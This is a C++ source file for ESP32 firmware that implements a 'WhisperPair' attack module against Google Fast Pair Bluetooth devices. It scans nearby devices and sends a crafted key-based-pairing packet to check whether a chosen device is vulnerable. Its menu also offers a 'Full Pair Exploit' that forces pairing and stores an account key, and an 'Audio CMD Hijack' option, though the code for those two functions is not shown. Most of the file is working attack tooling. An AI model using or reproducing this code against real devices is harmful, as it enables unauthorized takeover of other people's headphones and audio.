#include "whisperpair.h"
#include "whisperpair_audio.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include <BLEDevice.h>
#include <BLEAdvertisedDevice.h>
#include <BLEScan.h>
#include <BLEClient.h>
#include <BLEUtils.h>

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;

bool initBLEIfNeeded(const char* deviceName) {
    static bool initialized = false;
    
    if (!initialized) {
        Serial.printf("[BLE INIT] Initializing ESP32 BLE as '%s'\n", deviceName);
        
        BLEDevice::init(deviceName);
        delay(100);
        
        Serial.println("[BLE INIT] ESP32 BLE initialized successfully");
        initialized = true;
    }
    
    return true;
}

void updateScanDisplay(uint32_t foundCount, uint32_t elapsedMs, bool forceRedraw) {
    static uint32_t lastFound = 0;
    static uint32_t lastTime = 0;
    static uint32_t lastUpdate = 0;
    uint32_t now = millis();
    
    if(!forceRedraw && (now - lastUpdate < 250)) return;
    lastUpdate = now;
    
    if(forceRedraw || foundCount != lastFound) {
        tft.fillRect(20, 60, 200, 20, bruceConfig.bgColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.print("Found: " + String(foundCount));
        lastFound = foundCount;
    }
    
    uint32_t elapsedSeconds = elapsedMs / 1000;
    if(forceRedraw || elapsedSeconds != lastTime) {
        tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 80);
        tft.print("Time: " + String(elapsedSeconds) + "s");
        lastTime = elapsedSeconds;
    }
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print(message);
    tft.setCursor(20, 100);
    tft.print("Press SEL to confirm");
    tft.setCursor(20, 120);
    tft.print("or ESC to cancel");
    while(true) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", TFT_WHITE);
            delay(500);
            return false;
        }
        if(check(SelPress)) {
            displayMessage("Confirmed!", "", "", "", TFT_WHITE);
            delay(300);
            return true;
        }
        delay(50);
    }
}

bool attemptKeyBasedPairing(BLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);
    BLEClient* pClient = BLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", TFT_WHITE);
        BLEDevice::deleteClient(pClient);
        return false;
    }
    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);
    BLERemoteService* pService = pClient->getService(BLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        BLEDevice::deleteClient(pClient);
        return false;
    }
    BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        BLEDevice::deleteClient(pClient);
        return false;
    }
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
    memcpy(&packet[2], targetBytes, 6);
    esp_fill_random(&packet[8], 8);
    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);
    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
        delay(100);
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        pClient->disconnect();
        BLEDevice::deleteClient(pClient);
        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
            return false;
        }
    }
    pClient->disconnect();
    BLEDevice::deleteClient(pClient);
    return false;
}

String selectTargetFromScan(const char* title) {
    Serial.printf("\n[SCAN] Starting scan with title: %s\n", title);
    
    struct BLE_Device {
        std::string address;
        std::string name;
        int rssi;
    };
    std::vector<BLE_Device> foundDevices;
    bool scanning = false;
    foundDevices.clear();

    initBLEIfNeeded("scanner");

    BLEScan* pScan = BLEDevice::getScan();
    if (!pScan) {
        Serial.println("[SCAN] ERROR: Failed to get scanner!");
        displayMessage("Scanner init failed", "OK", "", "", TFT_RED);
        return "";
    }
    
    Serial.println("[SCAN] Scanner obtained successfully");
    
    pScan->clearResults();

    class SimpleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
        std::vector<BLE_Device>& devices;
        bool& scanningRef;
    public:
        SimpleScanCallbacks(std::vector<BLE_Device>& devs, bool& scanningFlag) 
            : devices(devs), scanningRef(scanningFlag) {}

        void onResult(BLEAdvertisedDevice advertisedDevice) {
            BLE_Device device;
            device.address = advertisedDevice.getAddress().toString();
            device.name = advertisedDevice.getName();
            device.rssi = advertisedDevice.getRSSI();
            
            if(device.name.empty()) device.name = "<no name>";
            
            Serial.printf("[SCAN] Found: %s - %s (%d dBm)\n", 
                device.address.c_str(), device.name.c_str(), device.rssi);
            
            bool exists = false;
            for(auto& dev : devices) {
                if(dev.address == device.address) {
                    exists = true;
                    dev.rssi = device.rssi;
                    break;
                }
            }
            if(!exists) {
                devices.push_back(device);
            }
        }
    };

    SimpleScanCallbacks* callbacks = new SimpleScanCallbacks(foundDevices, scanning);
    pScan->setAdvertisedDeviceCallbacks(callbacks);
    
    pScan->setActiveScan(true);
    pScan->setInterval(98);
    pScan->setWindow(48);
    pScan->setDuplicateFilter(true);
    pScan->setMaxResults(0);

    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    
    tft.setCursor(20, 60);
    tft.print("Found: 0");
    
    tft.setCursor(20, 80);
    tft.print("Time: 0s");
    
    tft.setCursor(20, 100);
    tft.print("Press ESC to stop");
    
    tft.fillRect(20, 140, tftWidth - 40, 10, TFT_DARKGREY);

    scanning = true;
    uint32_t scanStartTime = millis();
    
    Serial.println("[SCAN] Starting scan...");
    pScan->start(0, false);
    
    static int barPos = 0;
    uint32_t lastUpdate = 0;

    while(scanning) {
        uint32_t now = millis();
        
        if(now - lastUpdate > 250) {
            lastUpdate = now;
            
            tft.fillRect(20, 60, 100, 20, bruceConfig.bgColor);
            tft.setCursor(20, 60);
            tft.print("Found: " + String(foundDevices.size()));
            
            uint32_t elapsedSeconds = (now - scanStartTime) / 1000;
            tft.fillRect(20, 80, 100, 20, bruceConfig.bgColor);
            tft.setCursor(20, 80);
            tft.print("Time: " + String(elapsedSeconds) + "s");
            
            int barWidth = tftWidth - 40;
            tft.fillRect(20, 140, barWidth, 10, TFT_DARKGREY);
            barPos = (barPos + 5) % (barWidth - 20);
            tft.fillRect(20 + barPos, 140, 20, 10, TFT_GREEN);
        }
        
        if(check(EscPress)) {
            pScan->stop();
            scanning = false;
            Serial.println("[SCAN] Scan stopped by user");
            break;
        }
        
        delay(10);
    }

    pScan->clearResults();
    delete callbacks;
    
    Serial.printf("[SCAN] Scan complete. Found %d devices\n", foundDevices.size());

    if(foundDevices.empty()) {
        displayMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
        delay(1500);
        return "";
    }

    std::sort(foundDevices.begin(), foundDevices.end(), 
        [](const BLE_Device& a, const BLE_Device& b) {
            return a.rssi > b.rssi;
        });

    int currentIndex = 0;
    bool redraw = true;
    String selectedMAC = "";

    while(selectedMAC.isEmpty()) {
        if(check(EscPress)) break;
        
        if(redraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SELECT DEVICE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            
            tft.setCursor(20, 50);
            tft.print("Found: " + String(foundDevices.size()));
            
            tft.setCursor(20, 70);
            tft.print("Device " + String(currentIndex + 1) + "/" + String(foundDevices.size()));
            
            if(currentIndex < foundDevices.size()) {
                BLE_Device& dev = foundDevices[currentIndex];
                
                tft.setCursor(20, 100);
                tft.print("Name: " + String(dev.name.c_str()));
                
                tft.setCursor(20, 120);
                tft.print("MAC: " + String(dev.address.c_str()));
                
                tft.setCursor(20, 140);
                tft.print("RSSI: " + String(dev.rssi) + " dBm");
            }
            
            tft.setCursor(20, 180);
            tft.print("PREV/NEXT: Navigate");
            
            tft.setCursor(20, 200);
            tft.print("SEL: Select device");
            
            tft.setCursor(20, 220);
            tft.print("ESC: Cancel");
            
            redraw = false;
        }
        
        delay(50);
        
        if(check(PrevPress)) {
            if(currentIndex > 0) {
                currentIndex--;
                redraw = true;
            }
        } else if(check(NextPress)) {
            if(currentIndex < foundDevices.size() - 1) {
                currentIndex++;
                redraw = true;
            }
        } else if(check(SelPress)) {
            if(currentIndex < foundDevices.size()) {
                selectedMAC = String(foundDevices[currentIndex].address.c_str());
                Serial.printf("[SCAN] Selected MAC: %s\n", selectedMAC.c_str());
            }
        }
    }

    return selectedMAC;
}

void testFastPairVulnerability() {
    initBLEIfNeeded();
    
    String selectedMAC = selectTargetFromScan("SELECT TARGET");
    if(selectedMAC.isEmpty()) return;
    
    BLEAddress target(selectedMAC.c_str());
    
    if(!requireSimpleConfirmation("Test vulnerability?")) return;
    
    bool vulnerable = attemptKeyBasedPairing(target);
    
    Serial.printf("[WhisperPair] %s - %s\n", 
        selectedMAC.c_str(), 
        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
    );
    
    delay(2000);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[Scan & Test]", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[Full Pair Test]", []() {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("FULL PAIR EXPLOIT");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(1);
        
        int lineHeight = 18;
        int startY = 50;
        
        tft.setCursor(20, startY);
        tft.print("This will attempt full pairing:");
        
        tft.setCursor(20, startY + lineHeight);
        tft.print("1. Connect to target");
        
        tft.setCursor(20, startY + (lineHeight * 2));
        tft.print("2. ECDH key exchange");
        
        tft.setCursor(20, startY + (lineHeight * 3));
        tft.print("3. Complete pairing");
        
        tft.setCursor(20, startY + (lineHeight * 4));
        tft.print("4. Store account key");
        
        String prompt = "Press SEL to continue - ESC to cancel";
        int textWidth = prompt.length() * 6;
        int centerX = (tftWidth - textWidth) / 2;
        if (centerX < 20) centerX = 20;
        tft.setCursor(centerX, startY + (lineHeight * 5));
        tft.print(prompt);
        
        while(true) {
            if(check(EscPress)) return;
            if(check(SelPress)) break;
            delay(50);
        }
        String selectedMAC = selectTargetFromScan("SELECT TARGET");
        if(selectedMAC.isEmpty()) return;
        BLEAddress target(selectedMAC.c_str());
        int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
        if(confirm != 1) return;
        bool success = whisperPairFullExploit(target);
        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "OK", "", "", TFT_GREEN);
        } else {
            displayMessage("Exploit failed", "OK", "", "", TFT_RED);
        }
    }});

    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[Debug Menu]", []() {
        whisperPairDebugMenu();
    }});

    options.push_back({"[Back]", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}